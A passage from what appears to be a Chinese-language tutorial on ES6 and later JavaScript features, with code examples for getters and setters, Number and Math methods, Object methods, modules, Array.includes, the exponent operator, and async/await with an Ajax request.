添加一个set方法,当对一个属性进行设置时,执行set对应的函数<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Phone</span> <span class="token punctuation">&#123;</span><span class="token comment">//没有构造函数也是合法的</span>    <span class="token comment">//对price属性的读取绑定了个函数,只要读取实例对象的price属性,</span>    <span class="token comment">//就会执行这个函数(price)中的代码,该函数的返回值就是实例对象该属性的值</span>    <span class="token keyword">get</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'价格被读取了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token string">'111'</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//对price属性的修改绑定了个函数,当你对price这个属性进行赋值时</span>    <span class="token comment">//就会执行这个函数(price)中的代码</span>    <span class="token comment">//set函数必须有一个参数</span>    <span class="token keyword">set</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token parameter">newV</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'价格被修改了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> sj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sj<span class="token punctuation">.</span>price<span class="token punctuation">)</span> <span class="token comment">//它的值为get函数中的返回值</span>  sj<span class="token punctuation">.</span>price <span class="token operator">=</span> <span class="token string">'222'</span><span class="token punctuation">;</span></code></pre></p><h2 id="十七、数值扩展"><a href="#十七、数值扩展" class="headerlink" title="十七、数值扩展"></a>十七、数值扩展</h2><h3 id="1-二进制和八进制"><a href="#1-二进制和八进制" class="headerlink" title="1. 二进制和八进制"></a>1. 二进制和八进制</h3><p> ES6提供了二进制和八进制数值的新写法,分别用0b(二进制)和0o(八进制)表示<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//1.二进制和八进制</span>  <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token number">0b1010</span><span class="token punctuation">;</span> <span class="token comment">//二进制ob</span>  <span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token number">0o777</span><span class="token punctuation">;</span> <span class="token comment">//八进制(0o)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p><h3 id="2-Number-isFinite-与-Number-isNaN"><a href="#2-Number-isFinite-与-Number-isNaN" class="headerlink" title="2. Number.isFinite() 与 Number.isNaN()"></a>2. Number.isFinite() 与 Number.isNaN()</h3><p> ① Number.isFinite() 用来检查一个数值是否为有限的<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> yxs <span class="token operator">=</span> Number<span class="token punctuation">.</span><span class="token function">isFinite</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//有限 true</span>  <span class="token comment">//let yxs = Number.isFinite(10); //无限 false</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>yxs<span class="token punctuation">)</span></code></pre><br> ② Number.isNaN() 用来检查一个值是否为 NaN<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">// let ret = Number.isNaN('字符串001'); //false</span>  <span class="token keyword">let</span> ret <span class="token operator">=</span> Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span><span class="token number">001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p><h3 id="3-Number-parseInt-与-Number-parseFloat"><a href="#3-Number-parseInt-与-Number-parseFloat" class="headerlink" title="3. Number.parseInt() 与 Number.parseFloat()"></a>3. Number.parseInt() 与 Number.parseFloat()</h3><p> ES6 将全局方法 parseInt 和 parseFloat，移植到 Number 对象上面，使用不变<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> zs <span class="token operator">=</span> Number<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">'11560张三'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">let</span> xs <span class="token operator">=</span> Number<span class="token punctuation">.</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token string">'3.1415926张三001'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zs<span class="token punctuation">)</span>  <span class="token comment">//11560</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xs<span class="token punctuation">)</span>  <span class="token comment">//3.1415926</span></code></pre></p><h3 id="4-Number-isInteger"><a href="#4-Number-isInteger" class="headerlink" title="4. Number.isInteger"></a>4. Number.isInteger</h3><p> Number.isInteger() 用来判断一个数值是否为整数<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">// let sz = Number.isInteger(0.06) //false</span><span class="token keyword">let</span> sz <span class="token operator">=</span> Number<span class="token punctuation">.</span><span class="token function">isInteger</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span> <span class="token comment">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span></code></pre></p><h3 id="5-Math-trunc"><a href="#5-Math-trunc" class="headerlink" title="5. Math.trunc"></a>5. Math.trunc</h3><p> 用于去除一个数的小数部分，返回整数部分<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> qw <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">trunc</span><span class="token punctuation">(</span><span class="token number">3.50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>qw<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//3</span></code></pre></p><h3 id="6-Math-sign"><a href="#6-Math-sign" class="headerlink" title="6. Math.sign"></a>6. Math.sign</h3><p> Math.sign 判断一个数到底是正数、负数还是0<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//如果是正数,返回1 负数返回-1 零返回0</span><span class="token keyword">let</span> zz <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">let</span> fz <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">let</span> xsz <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">22</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zz<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fz<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xsz<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// -1</span></code></pre></p><h2 id="十八、对象扩展"><a href="#十八、对象扩展" class="headerlink" title="十八、对象扩展"></a>十八、对象扩展</h2><h3 id="1-Object-is"><a href="#1-Object-is" class="headerlink" title="1. Object.is"></a>1. Object.is</h3><p> 判断两个值是否严格相等,与全等基本一致<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">// let result = Object.is(135,135) true</span><span class="token keyword">let</span> result <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">,</span><span class="token number">NaN</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//NaN和任何数值作比较时,除了不等于以外,其他都为false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">NaN</span> <span class="token operator">===</span> <span class="token number">NaN</span><span class="token punctuation">)</span> <span class="token comment">//false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>  <span class="token comment">//true</span></code></pre></p><h3 id="2-Object-assign"><a href="#2-Object-assign" class="headerlink" title="2. Object.assign"></a>2. Object.assign</h3><p> 对象的合并，将源对象的所有可枚举属性，复制到目标对象<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//参数1:模板,被覆盖的 参数2: 覆盖的</span>   <span class="token comment">//如果出现重名的属性,后面的会把前面的覆盖掉</span>   <span class="token comment">//一个中有一个中没有也会合并</span>   <span class="token keyword">let</span> school <span class="token operator">=</span> <span class="token punctuation">&#123;</span>     name<span class="token operator">:</span> <span class="token string">'武大'</span><span class="token punctuation">,</span>     gps<span class="token operator">:</span> <span class="token string">'湖北武汉'</span><span class="token punctuation">,</span>     test<span class="token operator">:</span> <span class="token string">'法外狂徒'</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">let</span> school2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>     name<span class="token operator">:</span> <span class="token string">'张三'</span><span class="token punctuation">,</span>     gps<span class="token operator">:</span> <span class="token string">'陕西西安'</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">let</span> res <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>school<span class="token punctuation">,</span>school2<span class="token punctuation">)</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">//&#123;name: '张三', gps: '陕西西安', test: '法外狂徒'&#125;</span></code></pre></p><h3 id="3-Object-setPrototypeOf-和-Object-getPrototypeOf"><a href="#3-Object-setPrototypeOf-和-Object-getPrototypeOf" class="headerlink" title="3. Object.setPrototypeOf 和 Object.getPrototypeOf"></a>3. Object.setPrototypeOf 和 Object.getPrototypeOf</h3><p> Object.setPrototypeOf 设置原型对象 Object.getPrototypeOf 得到原型对象<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> schoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    name<span class="token operator">:</span> <span class="token string">'法外狂徒'</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> gps <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    teach<span class="token operator">:</span> <span class="token string">'罗翔老师'</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> ret <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">setPrototypeOf</span><span class="token punctuation">(</span>schoo<span class="token punctuation">,</span>school2<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>schoo<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//&#123;name: '张三', gps: '陕西西安'&#125;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token comment">// &#123;name: '法外狂徒'&#125;</span></code></pre></p><h2 id="十九、模块化"><a href="#十九、模块化" class="headerlink" title="十九、模块化"></a>十九、模块化</h2><h3 id="1-什么是模块化"><a href="#1-什么是模块化" class="headerlink" title="1. 什么是模块化"></a>1. 什么是模块化</h3><p> 模块化是指将一个大的程序文件，拆分成许多小的文件，然后将小文件组合起来</p><h3 id="2-模块化的好处"><a href="#2-模块化的好处" class="headerlink" title="2. 模块化的好处"></a>2. 模块化的好处</h3><p> (1) 防止命名冲突<br> (2) 代码复用<br> (3) 高维护性</p><h3 id="3-ES6之前的模块化规范"><a href="#3-ES6之前的模块化规范" class="headerlink" title="3. ES6之前的模块化规范"></a>3. ES6之前的模块化规范</h3><p> (1) CommonJS =&gt; NodeJS、Browserify<br> (2) AMD =&gt; requireJS<br> (3) CMD =&gt; seaJS</p><h3 id="4-ES6模块化语法"><a href="#4-ES6模块化语法" class="headerlink" title="4. ES6模块化语法"></a>4. ES6模块化语法</h3><p>模块功能主要由两个命令构成：export 和 import。<br> ① export 命令用于规定模块的对外接口<br> ② import 命令用于输入其他模块提供的功能</p><h3 id="5-基本使用"><a href="#5-基本使用" class="headerlink" title="5. 基本使用"></a>5. 基本使用</h3><h4 id="①-不同暴露的模块"><a href="#①-不同暴露的模块" class="headerlink" title="① 不同暴露的模块"></a>① 不同暴露的模块</h4><p> (1) 分别暴露<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">let</span> zxl <span class="token operator">=</span> <span class="token string">"张三"</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'say'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><br> (2) 统一暴露<br>   <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"法外狂徒张三"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以说相声!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token punctuation">&#123;</span> name<span class="token punctuation">,</span>say <span class="token punctuation">&#125;</span></code></pre><br> (3) 默认暴露<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>   name<span class="token operator">:</span> <span class="token string">'小6'</span><span class="token punctuation">,</span>   <span class="token function-variable function">change</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我什么时候才可以攒更多的钱呐!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></p><h4 id="②-通用的导入方式"><a href="#②-通用的导入方式" class="headerlink" title="② 通用的导入方式"></a>② 通用的导入方式</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//引入m.js文件 (分别暴露) as 别名</span>   <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> m1 <span class="token keyword">from</span> <span class="token string">'./js/m.js'</span>   <span class="token comment">//引入m2.js文件 (统一暴露)</span>   <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> m2 <span class="token keyword">from</span> <span class="token string">'./js/m2.js'</span>   <span class="token comment">// console.log(m2);</span>   <span class="token comment">//引入m3.js文件(默认暴露)</span>   <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> m3 <span class="token keyword">from</span> <span class="token string">'./js/m3.js'</span>   <span class="token comment">// m3.default.change()</span></code></pre><h4 id="③-解构赋值形式"><a href="#③-解构赋值形式" class="headerlink" title="③ 解构赋值形式"></a>③ 解构赋值形式</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>zxl<span class="token punctuation">,</span>say<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'./js/m.js'</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zxl<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>say<span class="token punctuation">)</span>  <span class="token comment">//可以用as起别名,解决引入时同名的问题</span>  <span class="token keyword">import</span> <span class="token punctuation">&#123;</span>name<span class="token punctuation">,</span>say <span class="token keyword">as</span> toSay<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'./js/m2.js'</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>toSay<span class="token punctuation">)</span>  <span class="token comment">//注意:引入默认暴露的js文件时,这里不可以直接用default，可以起一个别名</span>  <span class="token keyword">import</span> <span class="token punctuation">&#123;</span><span class="token keyword">default</span> <span class="token keyword">as</span> zzz<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'./js/m3.js'</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zzz<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zzz<span class="token punctuation">.</span>change<span class="token punctuation">)</span></code></pre><h4 id="④-简便形式"><a href="#④-简便形式" class="headerlink" title="④ 简便形式"></a>④ 简便形式</h4><p> 只针对于默认输出<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">import</span> bl <span class="token keyword">from</span> <span class="token string">'./js/m3.js'</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bl<span class="token punctuation">)</span></code></pre></p><h4 id="⑤-模块引入"><a href="#⑤-模块引入" class="headerlink" title="⑤ 模块引入"></a>⑤ 模块引入</h4><p> 将多个模块整合到一个文件中，在进行引入<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//引入其他模块</span><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> m1 <span class="token keyword">from</span> <span class="token string">'./m.js'</span><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> m2 <span class="token keyword">from</span> <span class="token string">'./m2.js'</span><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> m3 <span class="token keyword">from</span> <span class="token string">'./m3.js'</span></code></pre><br> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>写一个入口文件app<span class="token punctuation">,</span>在页面中进行引入<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"./js/app.js"</span> type<span class="token operator">=</span><span class="token string">"module"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></p><h2 id="二十、数组新特性"><a href="#二十、数组新特性" class="headerlink" title="二十、数组新特性"></a>二十、数组新特性</h2><h3 id="1-Array-prototype-includes"><a href="#1-Array-prototype-includes" class="headerlink" title="1. Array.prototype.includes"></a>1. Array.prototype.includes</h3><p> Includes 方法用来检测数组中是否包含某个元素，返回布尔类型值<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//includes 判断数组中是否包含某个元素，返回布尔值，包含返回true,否则返回false</span>  <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'唐僧'</span><span class="token punctuation">,</span><span class="token string">'八戒'</span><span class="token punctuation">,</span><span class="token string">'悟空'</span><span class="token punctuation">,</span><span class="token string">'沙僧'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> res <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'悟空'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>  <span class="token keyword">let</span> ret <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'白龙马'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p><h3 id="2-指数操作符"><a href="#2-指数操作符" class="headerlink" title="2. 指数操作符"></a>2. 指数操作符</h3><p> 在 ES7 中引入指数运算符「**」，用来实现幂运算，功能与 Math.pow 结果相同<br>  <pre class="language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//1024</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">//1024</span></code></pre></p><h2 id="二十一、async-和-await"><a href="#二十一、async-和-await" class="headerlink" title="二十一、async 和 await"></a>二十一、async 和 await</h2><p> async 和 await 两种语法结合可以让异步代码像同步代码一样</p><h3 id="1-async"><a href="#1-async" class="headerlink" title="1. async"></a>1. async</h3><p>  ① async 函数的返回值为 promise 对象</p><p>  ② promise 对象的结果由 async 函数执行的返回值决定<br>   <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  ①<span class="token comment">//返回一个字符串</span>  <span class="token comment">//如果返回的结果(return 后面的)不是promise类型的对象,函数返回的结果就是成功的promise对象</span>  <span class="token comment">// return '法外狂徒张三';</span>  ②<span class="token comment">//抛出异常,函数返回的结果是一个失败的promise对象</span>  <span class="token comment">//throw Error('出错了')</span>  ③<span class="token comment">//如果返回一个promise,如果内部返回的结果为成功的promise对象,result得到的结果也是成功的promise对象</span>  <span class="token comment">//如果内部返回的结果为一个失败的promise对象,result得到的结果也是失败的promise对象</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// resolve('成功的数据')</span>    <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'出错'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>result<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">reapon</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reapon<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre></p><h3 id="2-await"><a href="#2-await" class="headerlink" title="2. await"></a>2. await</h3><p> ① await 必须写在 async 函数中</p><p> ② await 右侧的表达式一般为 promise 对象</p><p> ③ await 返回的是 promise 成功的值</p><p> ④ await 的 promise 失败了, 就会抛出异常, 需要通过 try…catch 捕获处理<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> per <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>     <span class="token comment">// resolve('成功了,我终于是开发者了')</span>     <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'失败了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//如果promise失败,会抛出异常,通过try...catch进行捕获</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      <span class="token comment">//await 要放在async函数中,async函数中可以没有await</span>   <span class="token comment">//await 右侧的表达式一般为promise对象,await返回的是右侧promise对象成功的值</span>   <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> per<span class="token punctuation">;</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//res为await右侧promise成功的值</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>   <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></p><h3 id="3-async和await的ajax"><a href="#3-async和await的ajax" class="headerlink" title="3. async和await的ajax"></a>3. async和await的ajax</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//发送Ajax请求</span>  <span class="token keyword">function</span> <span class="token function">sendAjAx</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">//创建对象</span>    <span class="token keyword">const</span> x <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//初始化</span>    x<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//发送</span>    x<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//事件绑定</span>    x<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">.</span>status <span class="token operator">&lt;=</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">//如果成功</span>          <span class="token function">resolve</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>response<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token comment">//如果失败</span>          <span class="token function">reject</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>status<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span>  <span class="token comment">//async和await</span>   <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">sendAjAx</span><span class="token punctuation">(</span><span class="token string">'https://api.apiopen.top/getJoke'</span><span class="token punctuation">)</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="二十二、对象扩展"><a href="#二十二、对象扩展" class="headerlink" title="二十二、对象扩展"></a>二十二、对象扩展</h2><h3 id="1-Object-values"><a href="#1-Object-values" class="headerlink" title="1. Object.values"></a>1. Object.values</h3><p> Object.values() 方法返回一个给定对象的所有可枚举属性值的数组<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    name<span class="token 